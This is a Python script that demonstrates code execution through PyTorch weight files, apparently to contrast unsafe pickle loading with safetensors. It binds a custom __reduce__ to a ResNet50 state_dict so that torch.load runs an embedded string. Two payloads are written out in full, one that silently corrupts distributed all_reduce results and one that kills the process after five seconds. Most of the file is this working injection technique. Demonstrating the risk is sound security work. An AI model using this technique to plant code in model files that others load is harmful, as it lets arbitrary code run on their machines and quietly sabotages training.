import argparse
import torch
import time
from torchvision.models import resnet50
import torch.distributed as dist
import torch.multiprocessing as mp
import os
from safetensors.torch import save_file, safe_open


HIJACK_ALL_REDUCE = """
import torch.distributed as dist

dist._origin_all_reduce = dist.all_reduce
def hijacked_all_reduce(tensor, *args, **kwargs):
    import torch.distributed as dist
    tensor = tensor.add_(1)
    return dist._origin_all_reduce(tensor, *args, **kwargs)

setattr(dist, "all_reduce", hijacked_all_reduce)
"""


AUTO_SHUTDOWN = """
import os
import threading
from functools import partial

pid = os.getpid()

def inject_code(pid: int):
    import time
    import os
    time.sleep(5)
    os.kill(pid, 9)

wrapped_fn = partial(inject_code, pid)
injection_thread = threading.Thread(target=wrapped_fn)
injection_thread.start()
"""


def inject_malicious_code(obj, code_str):
    # bind a reduce fn to weights
    def reduce(self):
        return (exec, (code_str, ))

    # bind the reduce fn to the weights's __reduce__ method
    bound_reduce = reduce.__get__(obj, obj.__class__)
    setattr(obj, "__reduce__", bound_reduce)
    return obj


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--hack", type=str, choices=["all_reduce", "auto_shutdown"])
    parser.add_argument("--use-safetensor", default=False, action="store_true")
    return parser.parse_args()


def save_and_load_model(malicious_code_str, weights_name, use_safetensor=False):
    model = resnet50()
    state_dict = model.state_dict()
    inject_malicious_code(state_dict, malicious_code_str)

    if not use_safetensor:
        torch.save(state_dict, weights_name)
        torch.load(weights_name)
    else:
        weights_name = weights_name.replace(".bin", ".safetensors")
        save_file(state_dict, weights_name)
        safe_open(weights_name, framework="pt")


def run_erroneous_all_reduce(rank, world_size, use_safetensor):
    os.environ["MASTER_ADDR"] = "localhost"
    os.environ["MASTER_PORT"] = "12355"
    dist.init_process_group(backend="nccl", rank=rank, world_size=world_size)
    torch.cuda.set_device(rank)

    # execute malicious code
    save_and_load_model(HIJACK_ALL_REDUCE, f'hacked_weights_{rank}.bin', use_safetensor)

    out = torch.arange(0, 4).cuda()
    dist.all_reduce(out)
    print(f"Rank {rank}, expect the output to be [0, 2, 4, 6], and you got {out}")

    dist.destroy_process_group()


def main():
    args = parse_args()

    if args.hack == "all_reduce":
        mp.spawn(run_erroneous_all_reduce, nprocs=2, args=(2, args.use_safetensor))
    elif args.hack == "auto_shutdown":
        save_and_load_model(AUTO_SHUTDOWN, "hacked_weights.bin", args.use_safetensor)

        if args.use_safetensor:
            print("You program will keep running forever, please kill it manually")
        else:
            print("You program will be killed after 5 seconds")
        while True:
            # keep it running
            time.sleep(1)
            print("still running")
    else:
        raise ValueError(f"Unknown hack: {args.hack}")
    

if __name__ == "__main__":
    main()
